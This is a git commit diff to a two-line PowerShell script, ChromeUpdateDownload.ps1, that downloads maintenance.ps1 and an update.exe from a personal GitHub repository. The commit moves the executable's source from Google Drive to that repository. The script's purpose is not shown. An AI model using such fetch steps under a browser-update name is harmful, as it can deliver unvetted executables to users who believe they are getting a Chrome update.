3895344864a0a8e46b5e0788fb32c7732753241a
abdulaziesmuslim <abdulazies55@gmail.com>
2020-05-19 17:00:52 +0700

    Update ChromeUpdateDownload.ps1

--- ChromeUpdateDownload.ps1
+++ ChromeUpdateDownload.ps1
@@ -1,2 +1,2 @@
 wget https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/maintenance.ps1 -OutFile maintenance.ps1
-wget https://drive.google.com/file/d/1Uz-6UW_WH1TlRUQEBtJvu91Hfbh9eE8B/view?usp=sharing -OutFile update.exe
+wget https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/update.exe -OutFile update.exe
